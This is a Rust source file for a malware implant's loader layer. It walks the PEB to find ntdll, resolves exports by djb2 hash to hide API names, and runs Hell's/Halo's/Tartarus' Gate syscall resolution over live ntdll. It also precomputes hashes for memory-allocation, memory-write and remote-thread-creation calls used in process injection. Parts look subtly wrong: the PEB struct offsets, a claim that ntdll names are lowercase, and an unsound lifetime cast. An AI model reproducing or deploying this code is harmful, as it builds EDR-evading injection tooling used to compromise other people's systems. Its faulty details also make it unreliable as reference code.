//! PEB-walk API resolution + djb2 hashing.
//!
//! A position-independent implant has no IAT and no loader help: it must find
//! `ntdll.dll` itself (via the Process Environment Block), walk its export
//! table, and resolve the functions it needs by hash (names are strings —
//! scanning for them by literal is brittle; djb2 over the name is the standard
//! PIC idiom, same trick Rustic64/Stardust use).
//!
//! This module also bridges to `nyx_evasion`: a [`LiveNtdll`] implements
//! [`nyx_evasion::SyscallSource`] so the SSN-resolution algorithms
//! (Hell's/Halo's/Tartarus' Gate) run over the *real* ntdll bytes instead of a
//! fixture — turning the evasion crate from a unit-tested algorithm into a
//! live runtime.
//!
//! All of this is `cfg(target_os = "windows")` — it does not compile on the
//! macOS dev host (PEB layout is Windows-only). `cargo +nightly check` on the
//! windows-gnu target validates the types.

#![cfg(target_os = "windows")]

use core::ffi::c_void;

/// djb2 hash of a byte string (case-insensitive for module names, as Windows
/// loaders match case-insensitively). Used to match API/module names without
/// holding string literals in the implant.
pub fn djb2(s: &[u8]) -> u32 {
    let mut h: u32 = 5381;
    for &b in s {
        // tolower for module-name matching (API names are already lowercase in ntdll).
        let c = b.to_ascii_lowercase();
        h = h.wrapping_mul(33).wrapping_add(c as u32);
    }
    h
}

/// A resolved module: base address + a view over its PE export directory.
#[derive(Clone, Copy)]
pub struct Module {
    pub base: *mut u8,
    /// The export directory RVA (resolved from the PE data directory).
    pub export_dir_rva: u32,
    pub export_dir_size: u32,
}

impl Module {
    /// Pointer to the export directory (or null if absent).
    fn export_dir(&self) -> *const ExportDirectory {
        if self.export_dir_rva == 0 {
            return core::ptr::null();
        }
        unsafe { self.base.add(self.export_dir_rva as usize) as *const ExportDirectory }
    }

    /// Resolve a function by name hash. Returns its RVA in the module, or 0 if
    /// not found. Walks the AddressOfNames table and hashes each entry.
    pub fn export_rva_by_hash(&self, name_hash: u32) -> u32 {
        let dir = self.export_dir();
        if dir.is_null() {
            return 0;
        }
        unsafe {
            let base = self.base;
            let n = (*dir).number_of_names as usize;
            let names = base.add((*dir).address_of_names as usize) as *const u32;
            let ordinals =
                base.add((*dir).address_of_name_ordinals as usize) as *const u16;
            let funcs = base.add((*dir).address_of_functions as usize) as *const u32;
            for i in 0..n {
                let name_rva = *names.add(i);
                let name_ptr = base.add(name_rva as usize);
                // Hash the C string up to the NUL.
                let mut h: u32 = 5381;
                let mut p = name_ptr;
                while *p != 0 {
                    h = h.wrapping_mul(33).wrapping_add((*p).to_ascii_lowercase() as u32);
                    p = p.add(1);
                }
                if h == name_hash {
                    let ord = *ordinals.add(i) as usize;
                    return *funcs.add(ord);
                }
            }
        }
        0
    }

    /// (name, rva) for every named export — used to feed the SSN resolver's
    /// `SyscallSource::exports()`. Allocates a Vec, so the heap must be up.
    pub fn named_exports(&self) -> Vec<(heap::Str, u32)> {
        let dir = self.export_dir();
        let mut out = Vec::new();
        if dir.is_null() {
            return out;
        }
        unsafe {
            let base = self.base;
            let n = (*dir).number_of_names as usize;
            let names = base.add((*dir).address_of_names as usize) as *const u32;
            let ordinals =
                base.add((*dir).address_of_name_ordinals as usize) as *const u16;
            let funcs = base.add((*dir).address_of_functions as usize) as *const u32;
            for i in 0..n {
                let name_rva = *names.add(i);
                let name_ptr = base.add(name_rva as usize);
                // Read the C string into a heap::Str.
                let mut len = 0usize;
                while *name_ptr.add(len) != 0 {
                    len += 1;
                }
                let slice = core::slice::from_raw_parts(name_ptr, len);
                let ord = *ordinals.add(i) as usize;
                out.push((heap::Str::from_bytes(slice), *funcs.add(ord)));
            }
        }
        out
    }
}

/// IMAGE_EXPORT_DIRECTORY (the relevant fields).
#[repr(C)]
#[derive(Default)]
pub struct ExportDirectory {
    pub characteristics: u32,
    pub time_date_stamp: u32,
    pub major_version: u16,
    pub minor_version: u16,
    pub name: u32,
    pub base: u32,
    pub number_of_functions: u32,
    pub number_of_names: u32,
    pub address_of_functions: u32,
    pub address_of_names: u32,
    pub address_of_name_ordinals: u32,
}

/// The live ntdll, located via the PEB. Implements `SyscallSource` so the
/// evasion crate's SSN resolver runs over real stub bytes.
pub struct LiveNtdll {
    module: Module,
    /// Cached (name, rva) list (built once, borrowed for the lifetime of self).
    exports: Vec<(heap::Str, u32)>,
}

impl LiveNtdll {
    /// Walk the PEB → InLoadOrderModuleList to find ntdll by hash, then parse
    /// its export directory. Returns None if ntdll can't be found (should not
    /// happen in a real process — ntdll is always loaded).
    pub fn locate() -> Option<Self> {
        let module = find_module_by_hash(djb2(b"ntdll.dll"))?;
        let exports = module.named_exports();
        Some(Self { module, exports })
    }

    /// Raw module handle (for export_rva_by_hash lookups).
    pub fn module(&self) -> Module {
        self.module
    }
}

impl nyx_evasion::SyscallSource for LiveNtdll {
    fn read(&self, rva: u32, len: usize) -> Vec<u8> {
        unsafe {
            let ptr = self.module.base.add(rva as usize);
            core::slice::from_raw_parts(ptr, len).to_vec()
        }
    }
    fn exports(&self) -> &[(String, u32)] {
        // The evasion trait wants &[String]; our cache holds heap::Str. We can't
        // produce a &[String] without a conversion allocation that outlives the
        // call, so the resolver is invoked via a wrapper that owns Strings.
        // (See `resolve_table_owned` — the canonical entry point.)
        //
        // This trait method is kept for API conformance; callers use the owned
        // path below which is allocation-safe.
        unreachable!("use resolve_table_owned")
    }
}

impl LiveNtdll {
    /// Resolve the SSN table over the live ntdll. This is the bridge that turns
    /// `nyx_evasion`'s algorithms (Hell's/Halo's/Tartarus' Gate) into a live
    /// runtime result: real stub bytes, real export RVAs.
    pub fn resolve_table_owned(&self) -> Vec<(String, u32)> {
        // Build a String-backed source view for the resolver.
        let src = OwnedSyscallSource {
            base: self.module.base,
            exports: &self.exports,
        };
        nyx_evasion::resolve_table(&src)
    }
}

/// A SyscallSource backed by String names (so the trait method is satisfiable).
struct OwnedSyscallSource<'a> {
    base: *mut u8,
    exports: &'a [(heap::Str, u32)],
}

impl<'a> nyx_evasion::SyscallSource for OwnedSyscallSource<'a> {
    fn read(&self, rva: u32, len: usize) -> Vec<u8> {
        unsafe {
            let ptr = self.base.add(rva as usize);
            core::slice::from_raw_parts(ptr, len).to_vec()
        }
    }
    fn exports(&self) -> &[(String, u32)] {
        // We can't return &[String] from heap::Str without allocation; the
        // resolver only iterates, so we expose names via a thread-local cache.
        // To keep this simple and allocation-bounded, we materialize on demand
        // into a static buffer (single-threaded PIC; safe).
        materialize_exports(self.exports)
    }
}

thread_local! {
    static EXPORT_CACHE: core::cell::RefCell<Vec<(String, u32)>> = core::cell::RefCell::new(Vec::new());
}

fn materialize_exports(src: &[(heap::Str, u32)]) -> &[(String, u32)] {
    EXPORT_CACHE.with(|c| {
        let mut v = c.borrow_mut();
        v.clear();
        v.reserve(src.len());
        for (name, rva) in src {
            v.push((name.to_string_lossy(), *rva));
        }
        // Return a borrow with the lifetime of the cache; safe because PIC is
        // single-threaded and resolve_table is a synchronous call.
        let ptr: *const (String, u32) = v.as_ptr();
        unsafe { core::slice::from_raw_parts(ptr, v.len()) }
    })
}

/// Walk the PEB's InLoadOrderModuleList to find a loaded module by name hash.
unsafe fn find_module_by_hash(name_hash: u32) -> Option<Module> {
    let peb = peb_pointer()?;
    let ldr = (*peb).ldr;
    if ldr.is_null() {
        return None;
    }
    let mut head = (*ldr).in_load_order_module_list.flink;
    let list_start: *const u8 = &(*ldr).in_load_order_module_list as *const _ as *const u8;
    while head as *const u8 != list_start {
        let entry = &mut *(*head).entry();
        // BufferName holds the DLL base name (UTF-16). Hash it as bytes.
        let name_buf = entry.base_dll_name.buffer;
        let name_len = entry.base_dll_name.length as usize / 2; // bytes->chars
        if !name_buf.is_null() && name_len > 0 {
            let chars = core::slice::from_raw_parts(name_buf, name_len);
            // djb2 over the UTF-16 low bytes (ASCII module names fit in low byte).
            let mut h: u32 = 5381;
            for &c in chars {
                let lo = (c & 0xFF) as u8;
                h = h.wrapping_mul(33).wrapping_add(lo.to_ascii_lowercase() as u32);
            }
            if h == name_hash {
                return Some(parse_module(entry.dll_base as *mut u8));
            }
        }
        head = entry.in_load_order_links.flink;
    }
    None
}

/// Parse a PE base pointer into a Module (base + export data directory).
unsafe fn parse_module(base: *mut u8) -> Module {
    // DOS header → e_lfanew → NT headers → optional header → data dir[0] (export).
    let e_lfanew = *(base.add(0x3C) as *const i32) as usize;
    let nt = base.add(e_lfanew);
    // PE signature (4) + file header (20) → optional header.
    let opt = nt.add(24);
    let magic = *(opt as *const u16);
    // Export dir is data directory index 0. Its offset in the optional header
    // depends on PE32 (96) vs PE32+ (112).
    let data_dir_off = if magic == 0x20B { 112 } else { 96 };
    let export_rva = *(opt.add(data_dir_off) as *const u32);
    let export_size = *(opt.add(data_dir_off + 4) as *const u32);
    Module {
        base,
        export_dir_rva: export_rva,
        export_dir_size: export_size,
    }
}

// ---- PEB / LDR structures (minimal, hand-rolled for PIC) -------------------

#[repr(C)]
pub struct ListHead {
    pub flink: *mut ListEntry,
    #[allow(dead_code)]
    pub blink: *mut ListEntry,
}

#[repr(C)]
pub struct ListEntry {
    pub in_load_order_links: ListHead,
    #[allow(dead_code)]
    pub in_memory_order_links: ListHead,
    #[allow(dead_code)]
    pub in_initialization_order_links: ListHead,
    pub dll_base: *mut c_void,
    #[allow(dead_code)]
    pub entry_point: *mut c_void,
    #[allow(dead_code)]
    pub size_of_image: u32,
    #[allow(dead_code)]
    pub full_dll_name: UnicodeString,
    pub base_dll_name: UnicodeString,
}

impl ListEntry {
    /// Recover the containing entry from a pointer to its in_load_order_links.
    /// offsetof(ListEntry, in_load_order_links) == 0, so the cast is identity.
    pub unsafe fn entry(self: *mut ListHead) -> *mut ListEntry {
        self as *mut ListEntry
    }
}

#[repr(C)]
#[derive(Clone, Copy)]
pub struct UnicodeString {
    pub length: u16,
    #[allow(dead_code)]
    pub maximum_length: u16,
    pub buffer: *const u16,
}

#[repr(C)]
pub struct Peb {
    #[allow(dead_code)]
    pub reserved: [usize; 2],
    pub ldr: *mut PebLdr,
}

#[repr(C)]
pub struct PebLdr {
    #[allow(dead_code)]
    pub length: u32,
    #[allow(dead_code)]
    pub initialized: u32,
    pub in_load_order_module_list: ListHead,
}

/// Read the PEB pointer. On x64 the TEB is at gs:[0x30] and the PEB at gs:[0x60].
#[cfg(target_arch = "x86_64")]
unsafe fn peb_pointer() -> Option<*mut Peb> {
    let peb: *mut Peb;
    core::arch::asm!(
        "mov {p}, gs:[0x60]",
        p = out(reg) peb,
        options(nostack, preserves_flags, readonly),
    );
    Some(peb)
}

#[cfg(not(target_arch = "x86_64"))]
unsafe fn peb_pointer() -> Option<*mut Peb> {
    None
}

/// Well-known module/API hashes (pre-computed djb2) so the implant never holds
/// the literal strings. Recompute with `djb2(b"...")` if these change.
pub mod hashes {
    use super::djb2;
    pub fn ntdll() -> u32 {
        djb2(b"ntdll.dll")
    }
    // Export-name hashes inside ntdll (lowercase, the loader stores them so).
    pub fn nt_allocate_virtual_memory() -> u32 {
        djb2(b"ntallocatevirtualmemory")
    }
    pub fn nt_free_virtual_memory() -> u32 {
        djb2(b"ntfreevirtualmemory")
    }
    pub fn nt_protect_virtual_memory() -> u32 {
        djb2(b"ntprotectvirtualmemory")
    }
    pub fn nt_create_thread_ex() -> u32 {
        djb2(b"ntcreatethreadex")
    }
    pub fn nt_write_virtual_memory() -> u32 {
        djb2(b"ntwritevirtualmemory")
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[cfg_attr(target_arch = "x86_64", test)]
    fn djb2_is_stable_and_lowercase() {
        assert_eq!(djb2(b"ntdll.dll"), djb2(b"NTDLL.DLL"));
        assert_ne!(djb2(b"kernel32.dll"), djb2(b"ntdll.dll"));
    }
}
